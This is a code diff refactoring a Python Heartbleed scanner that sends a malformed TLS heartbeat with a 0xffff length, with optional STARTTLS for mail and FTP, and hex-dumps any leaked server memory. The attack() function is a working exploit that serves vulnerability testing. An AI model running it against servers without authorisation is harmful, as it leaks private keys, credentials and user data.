@@ -21,7 +21,10 @@
 #
 #
 # Several sections of code have been lifted from other detection scripts and
-# modified to make them more efficient.
+# modified to make them more efficient. Sources include but are likely not limited to:
+#
+# https://bitbucket.org/johannestaas/heartattack (johannestaas@gmail.com)
+# https://gist.github.com/takeshixx/10107280 (takeshix@adversec.com)
 #
 # Like other authors of Heartbleed scripts, I disclaim copyright to this source code.
 
@@ -35,45 +38,43 @@ import argparse
 import random
 import string
 
-bytes = 16
+num_bytes_per_line = 16
 display_null_bytes = False
 verbose = False
 
-STARTTLS = ['none', 'smtp', 'pop3', 'imap', 'ftp']
+starttls_options = ['none', 'smtp', 'pop3', 'imap', 'ftp']
+protocol_hex_to_name = {0x00:'SSLv3', 0x01:'TLSv1.0', 0x02:'TLSv1.1', 0x03:'TLSv1.2'}
+protocol_name_to_hex = dict(reversed(item) for item in protocol_hex_to_name.items())
 
-VERSIONS = {'sslv3':0, 'ssl3':0, 'tlsv1.0':1, 'tls1.0':1, 'tlsv1.1':2, 'tls1.1':2, 'tlsv1.2':3, 'tls1.2':3}
+alert_levels = {0x01:'warning', 0x02:'fatal'}
+alert_descriptions = {0x00:'Close notify', 0x0a:'Unexpected message', 0x14:'Bad record MAC', 0x15:'Decryption failed', 0x16:'Record overflow ', 0x1e:'Decompression failure', 0x28:'Handshake failure', 0x29:'No certificate', 0x2a:'Bad certificate', 0x2b:'Unsupported certificate', 0x2c:'Certificate revoked', 0x2d:'Certificate expired', 0x2e:'Certificate unknown', 0x2f:'Illegal parameter', 0x30:'Unknown CA', 0x31:'Access denied', 0x32:'Decode error', 0x33:'Decrypt error', 0x3c:'Export restriction', 0x46:'Protocol version', 0x47:'Insufficient security', 0x50:'Internal error', 0x5a:'User canceled', 0x64:'No renegotiation', 0x6e:'Unsupported extension', 0x6f:'Certificate unobtainable', 0x70:'Unrecognized name', 0x71:'Bad certificate status response', 0x72:'Bad certificate hash value', 0x73:'Unknown PSK identity'}
 
-alertLevel = {1:'warning', 2:'fatal'}
-alertDescription = {0:'Close notify', 10:'Unexpected message', 20:'Bad record MAC', 21:'Decryption failed', 22:'Record overflow ', 30:'Decompression failure', 40:'Handshake failure', 41:'No certificate', 42:'Bad certificate', 43:'Unsupported certificate', 44:'Certificate revoked', 45:'Certificate expired', 46:'Certificate unknown', 47:'Illegal parameter', 48:'Unknown CA', 49:'Access denied', 50:'Decode error', 51:'Decrypt error', 60:'Export restriction', 70:'Protocol version', 71:'Insufficient security', 80:'Internal error', 90:'User canceled', 100:'No renegotiation', 110:'Unsupported extension', 111:'Certificate unobtainable', 112:'Unrecognized name', 113:'Bad certificate status response', 114:'Bad certificate hash value', 115:'Unknown PSK identity'}
-
-BUFFERSIZE = 1024
+buffer_size = 1024
 
 def rand(size=10, chars=string.letters + string.digits):
     return ''.join(random.choice(chars) for _ in range(size))
 
 def hexdump(s):
-    global bytes, display_null_bytes
     s = str(s)
-    for b in xrange(0, len(s), bytes):
-        lin = [c for c in s[b : b + bytes]]
+    for b in xrange(0, len(s), num_bytes_per_line):
+        lin = [c for c in s[b : b + num_bytes_per_line]]
         hxdat = ' '.join('%02X' % ord(c) for c in lin)
         pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
         if pdat:
-            if not display_null_bytes:
-                if not re.match('^\.{' + str(bytes) + '}$', pdat):
-                    print '  %04x: %-48s %s' % (b, hxdat, pdat)
-            else:
+            if display_null_bytes:
+                print '  %04x: %-48s %s' % (b, hxdat, pdat)
+            elif not re.match('^\.{' + str(num_bytes_per_line) + '}$', pdat):
                 print '  %04x: %-48s %s' % (b, hxdat, pdat)
     sys.stdout.flush()
 
-def h2bin(x):
-    return x.replace(' ', '').replace('\n', '').decode('hex')
-
+def hex2bin(arr):
+    return ''.join('{:02x}'.format(x) for x in arr).decode('hex')
+    
 def gen_clienthello(v):
-    return h2bin('16 03 0' + str(v) + ' 02 ae 01 00 02 aa 03 0' + str(v) + ' 53 48 73 f0 7c ca c1 d9 02 04 f2 1d 2d 49 f5 12 bf 40 1b 94 d9 93 e4 c4 f4 f0 d0 42 cd 44 a2 59 00 02 7c 00 00 00 01 00 02 00 03 00 04 00 05 00 06 00 07 00 08 00 09 00 0a 00 0b 00 0c 00 0d 00 0e 00 0f 00 10 00 11 00 12 00 13 00 14 00 15 00 16 00 17 00 18 00 19 00 1a 00 1b 00 1e 00 1f 00 20 00 21 00 22 00 23 00 24 00 25 00 26 00 27 00 28 00 29 00 2a 00 2b 00 2c 00 2d 00 2e 00 2f 00 30 00 31 00 32 00 33 00 34 00 35 00 36 00 37 00 38 00 39 00 3a 00 3b 00 3c 00 3d 00 3e 00 3f 00 40 00 41 00 42 00 43 00 44 00 45 00 46 00 67 00 68 00 69 00 6a 00 6b 00 6c 00 6d 00 84 00 85 00 86 00 87 00 88 00 89 00 8a 00 8b 00 8c 00 8d 00 8e 00 8f 00 90 00 91 00 92 00 93 00 94 00 95 00 96 00 97 00 98 00 99 00 9a 00 9b 00 9c 00 9d 00 9e 00 9f 00 a0 00 a1 00 a2 00 a3 00 a4 00 a5 00 a6 00 a7 00 a8 00 a9 00 aa 00 ab 00 ac 00 ad 00 ae 00 af 00 b0 00 b1 00 b2 00 b3 00 b4 00 b5 00 b6 00 b7 00 b8 00 b9 00 ba 00 bb 00 bc 00 bd 00 be 00 bf 00 c0 00 c1 00 c2 00 c3 00 c4 00 c5 00 ff c0 01 c0 02 c0 03 c0 04 c0 05 c0 06 c0 07 c0 08 c0 09 c0 0a c0 0b c0 0c c0 0d c0 0e c0 0f c0 10 c0 11 c0 12 c0 13 c0 14 c0 15 c0 16 c0 17 c0 18 c0 19 c0 1a c0 1b c0 1c c0 1d c0 1e c0 1f c0 20 c0 21 c0 22 c0 23 c0 24 c0 25 c0 26 c0 27 c0 28 c0 29 c0 2a c0 2b c0 2c c0 2d c0 2e c0 2f c0 30 c0 31 c0 32 c0 33 c0 34 c0 35 c0 36 c0 37 c0 38 c0 39 c0 3a c0 3b c0 3c c0 3d c0 3e c0 3f c0 40 c0 41 c0 42 c0 43 c0 44 c0 45 c0 46 c0 47 c0 48 c0 49 c0 4a c0 4b c0 4c c0 4d c0 4e c0 4f c0 50 c0 51 c0 52 c0 53 c0 54 c0 55 c0 56 c0 57 c0 58 c0 59 c0 5a c0 5b c0 5c c0 5d c0 5e c0 5f c0 60 c0 61 c0 62 c0 63 c0 64 c0 65 c0 66 c0 67 c0 68 c0 69 c0 6a c0 6b c0 6c c0 6d c0 6e c0 6f c0 70 c0 71 c0 72 c0 73 c0 74 c0 75 c0 76 c0 77 c0 78 c0 79 c0 7a c0 7b c0 7c c0 7d c0 7e c0 7f c0 80 c0 81 c0 82 c0 83 c0 84 c0 85 c0 86 c0 87 c0 88 c0 89 c0 8a c0 8b c0 8c c0 8d c0 8e c0 8f c0 90 c0 91 c0 92 c0 93 c0 94 c0 95 c0 96 c0 97 c0 98 c0 99 c0 9a c0 9b c0 9c c0 9d c0 9e c0 9f c0 a0 c0 a1 c0 a2 c0 a3 c0 a4 c0 a5 c0 a6 c0 a7 c0 a8 c0 a9 c0 aa c0 ab c0 ac c0 ad c0 ae c0 af 01 00 00 05 00 0f 00 01 01')
+    return hex2bin([0x16, 0x03, v, 0x02, 0xf2, 0x01, 0x00, 0x02, 0xee, 0x03, v, 0x53, 0x48, 0x73, 0xf0, 0x7c, 0xca, 0xc1, 0xd9, 0x02, 0x04, 0xf2, 0x1d, 0x2d, 0x49, 0xf5, 0x12, 0xbf, 0x40, 0x1b, 0x94, 0xd9, 0x93, 0xe4, 0xc4, 0xf4, 0xf0, 0xd0, 0x42, 0xcd, 0x44, 0xa2, 0x59,0x00, 0x02, 0x7c, 0x00, 0x00, 0x00, 0x01, 0x00, 0x02, 0x00, 0x03, 0x00, 0x04, 0x00, 0x05, 0x00, 0x06, 0x00, 0x07, 0x00, 0x08, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x0b, 0x00, 0x0c, 0x00, 0x0d, 0x00, 0x0e, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11, 0x00, 0x12, 0x00, 0x13, 0x00, 0x14, 0x00, 0x15, 0x00, 0x16, 0x00, 0x17, 0x00, 0x18, 0x00, 0x19, 0x00, 0x1a, 0x00, 0x1b, 0x00, 0x1e, 0x00, 0x1f, 0x00, 0x20, 0x00, 0x21, 0x00, 0x22, 0x00, 0x23, 0x00, 0x24, 0x00, 0x25, 0x00, 0x26, 0x00, 0x27, 0x00, 0x28, 0x00, 0x29, 0x00, 0x2a, 0x00, 0x2b, 0x00, 0x2c, 0x00, 0x2d, 0x00, 0x2e, 0x00, 0x2f, 0x00, 0x30, 0x00, 0x31, 0x00, 0x32, 0x00, 0x33, 0x00, 0x34, 0x00, 0x35, 0x00, 0x36, 0x00, 0x37, 0x00, 0x38, 0x00, 0x39, 0x00, 0x3a, 0x00, 0x3b, 0x00, 0x3c, 0x00, 0x3d, 0x00, 0x3e, 0x00, 0x3f, 0x00, 0x40, 0x00, 0x41, 0x00, 0x42, 0x00, 0x43, 0x00, 0x44, 0x00, 0x45, 0x00, 0x46, 0x00, 0x67, 0x00, 0x68, 0x00, 0x69, 0x00, 0x6a, 0x00, 0x6b, 0x00, 0x6c, 0x00, 0x6d, 0x00, 0x84, 0x00, 0x85, 0x00, 0x86, 0x00, 0x87, 0x00, 0x88, 0x00, 0x89, 0x00, 0x8a, 0x00, 0x8b, 0x00, 0x8c, 0x00, 0x8d, 0x00, 0x8e, 0x00, 0x8f, 0x00, 0x90, 0x00, 0x91, 0x00, 0x92, 0x00, 0x93, 0x00, 0x94, 0x00, 0x95, 0x00, 0x96, 0x00, 0x97, 0x00, 0x98, 0x00, 0x99, 0x00, 0x9a, 0x00, 0x9b, 0x00, 0x9c, 0x00, 0x9d, 0x00, 0x9e, 0x00, 0x9f, 0x00, 0xa0, 0x00, 0xa1, 0x00, 0xa2, 0x00, 0xa3, 0x00, 0xa4, 0x00, 0xa5, 0x00, 0xa6, 0x00, 0xa7, 0x00, 0xa8, 0x00, 0xa9, 0x00, 0xaa, 0x00, 0xab, 0x00, 0xac, 0x00, 0xad, 0x00, 0xae, 0x00, 0xaf, 0x00, 0xb0, 0x00, 0xb1, 0x00, 0xb2, 0x00, 0xb3, 0x00, 0xb4, 0x00, 0xb5, 0x00, 0xb6, 0x00, 0xb7, 0x00, 0xb8, 0x00, 0xb9, 0x00, 0xba, 0x00, 0xbb, 0x00, 0xbc, 0x00, 0xbd, 0x00, 0xbe, 0x00, 0xbf, 0x00, 0xc0, 0x00, 0xc1, 0x00, 0xc2, 0x00, 0xc3, 0x00, 0xc4, 0x00, 0xc5, 0x00, 0xff, 0xc0, 0x01, 0xc0, 0x02, 0xc0, 0x03, 0xc0, 0x04, 0xc0, 0x05, 0xc0, 0x06, 0xc0, 0x07, 0xc0, 0x08, 0xc0, 0x09, 0xc0, 0x0a, 0xc0, 0x0b, 0xc0, 0x0c, 0xc0, 0x0d, 0xc0, 0x0e, 0xc0, 0x0f, 0xc0, 0x10, 0xc0, 0x11, 0xc0, 0x12, 0xc0, 0x13, 0xc0, 0x14, 0xc0, 0x15, 0xc0, 0x16, 0xc0, 0x17, 0xc0, 0x18, 0xc0, 0x19, 0xc0, 0x1a, 0xc0, 0x1b, 0xc0, 0x1c, 0xc0, 0x1d, 0xc0, 0x1e, 0xc0, 0x1f, 0xc0, 0x20, 0xc0, 0x21, 0xc0, 0x22, 0xc0, 0x23, 0xc0, 0x24, 0xc0, 0x25, 0xc0, 0x26, 0xc0, 0x27, 0xc0, 0x28, 0xc0, 0x29, 0xc0, 0x2a, 0xc0, 0x2b, 0xc0, 0x2c, 0xc0, 0x2d, 0xc0, 0x2e, 0xc0, 0x2f, 0xc0, 0x30, 0xc0, 0x31, 0xc0, 0x32, 0xc0, 0x33, 0xc0, 0x34, 0xc0, 0x35, 0xc0, 0x36, 0xc0, 0x37, 0xc0, 0x38, 0xc0, 0x39, 0xc0, 0x3a, 0xc0, 0x3b, 0xc0, 0x3c, 0xc0, 0x3d, 0xc0, 0x3e, 0xc0, 0x3f, 0xc0, 0x40, 0xc0, 0x41, 0xc0, 0x42, 0xc0, 0x43, 0xc0, 0x44, 0xc0, 0x45, 0xc0, 0x46, 0xc0, 0x47, 0xc0, 0x48, 0xc0, 0x49, 0xc0, 0x4a, 0xc0, 0x4b, 0xc0, 0x4c, 0xc0, 0x4d, 0xc0, 0x4e, 0xc0, 0x4f, 0xc0, 0x50, 0xc0, 0x51, 0xc0, 0x52, 0xc0, 0x53, 0xc0, 0x54, 0xc0, 0x55, 0xc0, 0x56, 0xc0, 0x57, 0xc0, 0x58, 0xc0, 0x59, 0xc0, 0x5a, 0xc0, 0x5b, 0xc0, 0x5c, 0xc0, 0x5d, 0xc0, 0x5e, 0xc0, 0x5f, 0xc0, 0x60, 0xc0, 0x61, 0xc0, 0x62, 0xc0, 0x63, 0xc0, 0x64, 0xc0, 0x65, 0xc0, 0x66, 0xc0, 0x67, 0xc0, 0x68, 0xc0, 0x69, 0xc0, 0x6a, 0xc0, 0x6b, 0xc0, 0x6c, 0xc0, 0x6d, 0xc0, 0x6e, 0xc0, 0x6f, 0xc0, 0x70, 0xc0, 0x71, 0xc0, 0x72, 0xc0, 0x73, 0xc0, 0x74, 0xc0, 0x75, 0xc0, 0x76, 0xc0, 0x77, 0xc0, 0x78, 0xc0, 0x79, 0xc0, 0x7a, 0xc0, 0x7b, 0xc0, 0x7c, 0xc0, 0x7d, 0xc0, 0x7e, 0xc0, 0x7f, 0xc0, 0x80, 0xc0, 0x81, 0xc0, 0x82, 0xc0, 0x83, 0xc0, 0x84, 0xc0, 0x85, 0xc0, 0x86, 0xc0, 0x87, 0xc0, 0x88, 0xc0, 0x89, 0xc0, 0x8a, 0xc0, 0x8b, 0xc0, 0x8c, 0xc0, 0x8d, 0xc0, 0x8e, 0xc0, 0x8f, 0xc0, 0x90, 0xc0, 0x91, 0xc0, 0x92, 0xc0, 0x93, 0xc0, 0x94, 0xc0, 0x95, 0xc0, 0x96, 0xc0, 0x97, 0xc0, 0x98, 0xc0, 0x99, 0xc0, 0x9a, 0xc0, 0x9b, 0xc0, 0x9c, 0xc0, 0x9d, 0xc0, 0x9e, 0xc0, 0x9f, 0xc0, 0xa0, 0xc0, 0xa1, 0xc0, 0xa2, 0xc0, 0xa3, 0xc0, 0xa4, 0xc0, 0xa5, 0xc0, 0xa6, 0xc0, 0xa7, 0xc0, 0xa8, 0xc0, 0xa9, 0xc0, 0xaa, 0xc0, 0xab, 0xc0, 0xac, 0xc0, 0xad, 0xc0, 0xae, 0xc0, 0xaf,0x01, 0x00, 0x00, 0x49, 0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,0x00, 0x23, 0x00, 0x00,0x00, 0x0f, 0x00, 0x01, 0x01])
 
 def gen_heartbeat(v):
-    return h2bin('18 03 0' + str(v) + ' 00 03 01 ff ff')
+    return hex2bin([0x18, 0x03, v, 0x00, 0x03, 0x01, 0xff, 0xff])
 
 def recvall(s, length, timeout=5):
     end = time.time() + timeout
@@ -108,21 +109,12 @@ def recvmsg(s, timeout=5):
     return type, version, payload
 
 def attack(ip, port, tlsversion, starttls='none', timeout=5):
-    if tlsversion == 3:
-        tlslongver = 'TLSv1.2'
-    elif tlsversion == 2:
-        tlslongver = 'TLSv1.1'
-    elif tlsversion == 0:
-        tlslongver = 'SSLv3.0'
+    tlslongver = protocol_hex_to_name[tlsversion]
+        
+    if starttls == 'none':
+        print '[INFO] Connecting to ' + str(ip) + ':' + str(port) + ' using ' + tlslongver
     else:
-        tlsversion = 1
-        tlslongver = 'TLSv1.0'
-        
-    withstarttls = ''
-    if starttls != 'none':
-        withstarttls = ' with STARTTLS'
-        
-    print '[INFO] Connecting to ' + str(ip) + ':' + str(port) + ' using ' + tlslongver + withstarttls
+        print '[INFO] Connecting to ' + str(ip) + ':' + str(port) + ' using ' + tlslongver + ' with STARTTLS'
     sys.stdout.flush()
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -132,28 +124,28 @@ def attack(ip, port, tlsversion, starttls='none', timeout=5):
         s.connect((ip, port))
         
         if starttls == 'smtp':
-            recvall(s, BUFFERSIZE)
+            recvall(s, buffer_size)
             s.send('ehlo ' + rand(10) + '\n')
-            res = recvall(s, BUFFERSIZE)
+            res = recvall(s, buffer_size)
             if not 'STARTTLS' in res:
                 print >> sys.stderr, '\033[93m[ERROR] STARTTLS does not appear to be supported.\033[0m\n'
                 sys.stderr.flush()
                 return False
             s.send('starttls\n')
-            recvall(s, BUFFERSIZE)
+            recvall(s, buffer_size)
         elif starttls == 'pop3':
-            recvall(s, BUFFERSIZE)
+            recvall(s, buffer_size)
             s.send("STLS\n")
-            recvall(s, BUFFERSIZE)
+            recvall(s, buffer_size)
         elif starttls == 'imap':
-            recvall(s, BUFFERSIZE)
+            recvall(s, buffer_size)
             s.send("STARTTLS\n")
-            recvall(s, BUFFERSIZE)
+            recvall(s, buffer_size)
         elif starttls == 'ftp':
-            recvall(s, BUFFERSIZE)
+            recvall(s, buffer_size)
             s.send("AUTH TLS\n")
-            recvall(s, BUFFERSIZE)
-                    
+            recvall(s, buffer_size)
+
         s.send(gen_clienthello(tlsversion))
         
         while True:
@@ -193,8 +185,8 @@ def attack(ip, port, tlsversion, starttls='none', timeout=5):
     
             if type == 21:
                 print '[INFO] The server received an alert. It is likely not vulnerable.'
-                if verbose: print '[INFO] Alert Level: ' + alertLevel[int(payload[0].encode('hex'), 16)]
-                if verbose: print '[INFO] Alert Description: ' + alertDescription[int(payload[1].encode('hex'), 16)] + ' (see RFC 5246 section 7.2)'
+                if verbose: print '[INFO] Alert Level: ' + alert_levels[ord(payload[0])]
+                if verbose: print '[INFO] Alert Description: ' + alert_descriptions[ord(payload[1])] + ' (see RFC 5246 section 7.2)'
                 print ''
                 sys.stdout.flush()
                 return False
@@ -223,7 +215,7 @@ def main():
     args = parser.parse_args()
     
     args.starttls = args.starttls.lower()
-    if args.starttls not in STARTTLS:
+    if args.starttls not in starttls_options:
         print >> sys.stderr, '\033[93m[ERROR] Invalid STARTTLS value. Valid values: none, smtp, pop3, imap, ftp.\033[0m\n'
         parser.print_help()
         sys.exit(1)
@@ -233,14 +225,13 @@ def main():
     verbose = args.verbose
     
     versions = []
-    for v in [x.lower() for x in args.version.split(',')]:
-        v = v.strip()
+    for v in [x.strip() for x in args.version.split(',')]:
         if v:
             versions.append(v)
     
     if 'all' not in versions:
         for v in versions:
-            if v not in VERSIONS:
+            if v not in protocol_name_to_hex:
                 print >> sys.stderr, '\033[93m[ERROR] Invalid SSL/TLS version(s). Valid values: SSLv3, TLSv1.0, TLSv1.1, TLSv1.2.\033[0m\n'
                 parser.print_help()
                 sys.exit(1)
@@ -274,10 +265,10 @@ def main():
         for port in ports:
             if 'all' in versions:
                 if (args.all_versions):
-                    ssl30 = attack(ip, port, 0, starttls=args.starttls, timeout=args.timeout)
-                    tls10 = attack(ip, port, 1, starttls=args.starttls, timeout=args.timeout)
-                    tls11 = attack(ip, port, 2, starttls=args.starttls, timeout=args.timeout)
-                    tls12 = attack(ip, port, 3, starttls=args.starttls, timeout=args.timeout)
+                    ssl30 = attack(ip, port, 0x00, starttls=args.starttls, timeout=args.timeout)
+                    tls10 = attack(ip, port, 0x01, starttls=args.starttls, timeout=args.timeout)
+                    tls11 = attack(ip, port, 0x02, starttls=args.starttls, timeout=args.timeout)
+                    tls12 = attack(ip, port, 0x03, starttls=args.starttls, timeout=args.timeout)
                     
                     if not ssl30 and not tls10 and not tls11 and not tls12:
                         if ip == host:
@@ -286,10 +277,10 @@ def main():
                             print '\033[1m[PASS] ' + host + ':' + str(port) + ' (' + str(ip) + ':' + str(port) +') does not appear to be vulnerable to Heartbleed!\033[0m\n'
                         sys.stdout.flush()
                 else:
-                    if not attack(ip, port, 0, starttls=args.starttls, timeout=args.timeout):
-                        if not attack(ip, port, 1, starttls=args.starttls, timeout=args.timeout):
-                            if not attack(ip, port, 2, starttls=args.starttls, timeout=args.timeout):
-                                if not attack(ip, port, 3, starttls=args.starttls, timeout=args.timeout):
+                    if not attack(ip, port, 0x00, starttls=args.starttls, timeout=args.timeout):
+                        if not attack(ip, port, 0x01, starttls=args.starttls, timeout=args.timeout):
+                            if not attack(ip, port, 0x02, starttls=args.starttls, timeout=args.timeout):
+                                if not attack(ip, port, 0x03, starttls=args.starttls, timeout=args.timeout):
                                     if ip == host:
                                         print '\033[1m[PASS] ' + host + ':' + str(port) + ' does not appear to be vulnerable to Heartbleed!\033[0m\n'
                                     else:
@@ -299,7 +290,7 @@ def main():
                 if (args.all_versions):
                     vulnerable = []
                     for v in versions:
-                        if attack(ip, port, VERSIONS[v], starttls=args.starttls, timeout=args.timeout):
+                        if attack(ip, port, protocol_name_to_hex[v], starttls=args.starttls, timeout=args.timeout):
                             vulnerable.append(True)
                     if True not in vulnerable:
                         if ip == host:
@@ -310,7 +301,7 @@ def main():
                 else:
                     vulnerable = True
                     for v in versions:
-                        vulnerable = attack(ip, port, VERSIONS[v], starttls=args.starttls, timeout=args.timeout)
+                        vulnerable = attack(ip, port, protocol_name_to_hex[v], starttls=args.starttls, timeout=args.timeout)
                         if vulnerable:
                             break
                         else:
